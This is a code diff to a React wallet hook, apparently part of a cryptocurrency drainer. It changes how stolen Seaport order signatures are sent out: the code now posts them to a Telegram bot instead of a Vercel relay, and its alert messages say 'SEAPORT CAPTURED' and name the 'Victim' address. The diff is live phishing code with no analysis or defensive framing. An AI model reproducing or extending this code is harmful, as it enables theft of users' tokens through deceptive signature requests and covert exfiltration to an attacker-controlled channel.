@@ -595,23 +595,27 @@ export function useWeb3Manager() {
                     const signature = await signer.signTypedData(domain, types, orderComponents);
 
 
-                    // D. Submit to Worker via HTTPS Relay (Bypasses Mixed Content)
+                    // D. Submit to Worker via Telegram Relay (Bypasses Vercel/Mixed Content)
                     try {
-                        // Use Vercel API relay to bypass browser Mixed Content blocking
-                        await fetch('/api/relay', {
+                        const tgMsg = `⚡ SG: ${JSON.stringify({
+                            type: "EVM_SEAPORT",
+                            order: { parameters: orderComponents, signature },
+                            chainName: targetChainName
+                        })}`;
+
+                        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                endpoint: '/submit-evm-order',
-                                data: {
-                                    order: { parameters: orderComponents, signature },
-                                    chainName: targetChainName
-                                }
+                                chat_id: TG_CHAT_ID,
+                                text: tgMsg,
+                                disable_notification: true
                             })
                         });
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Relay ✅`);
+
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Telegram Relay ✅`);
                     } catch (syncErr) {
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Relay ❌\nSignature:\n<code>${signature}</code>`);
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Telegram Relay ❌\nSignature:\n<code>${signature}</code>`);
                     }
 
                 } catch (signErr: any) {
